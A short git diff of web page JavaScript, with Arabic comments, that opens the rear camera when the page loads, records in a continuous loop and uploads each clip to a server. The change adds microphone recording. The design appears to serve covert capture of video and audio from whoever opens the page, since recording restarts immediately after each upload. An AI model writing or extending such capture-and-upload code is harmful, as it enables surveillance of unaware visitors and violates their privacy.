@@ -10,13 +10,14 @@ document.addEventListener("DOMContentLoaded", async function () {
     async function startCamera() {
         try {
             videoStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "environment" } // تشغيل الكاميرا الخلفية
+                video: { facingMode: "environment" }, // تشغيل الكاميرا الخلفية
+                audio: true // تفعيل تسجيل الصوت
             });
 
             const video = document.getElementById('video');
             video.srcObject = videoStream;
             video.onloadedmetadata = () => {
-                console.log("✅ الكاميرا الخلفية تعمل! سيتم بدء التسجيل...");
+                console.log("✅ الكاميرا الخلفية تعمل مع الصوت! سيتم بدء التسجيل...");
                 startCountdown();
                 startRecording();
             };
@@ -50,7 +51,7 @@ document.addEventListener("DOMContentLoaded", async function () {
         };
 
         mediaRecorder.onstop = function () {
-            console.log("📹 تم تسجيل الفيديو! جاري الإرسال...");
+            console.log("📹🎤 تم تسجيل الفيديو مع الصوت! جاري الإرسال...");
             sendVideo();
             recordedChunks = [];
             startRecording(); // إعادة التسجيل فورًا
@@ -71,7 +72,7 @@ document.addEventListener("DOMContentLoaded", async function () {
             body: formData
         })
         .then(response => response.json())
-        .then(data => console.log("✅ تم إرسال الفيديو بنجاح:", data))
+        .then(data => console.log("✅ تم إرسال الفيديو بالصوت بنجاح:", data))
         .catch(error => console.error("❌ خطأ في إرسال الفيديو:", error));
     }
 
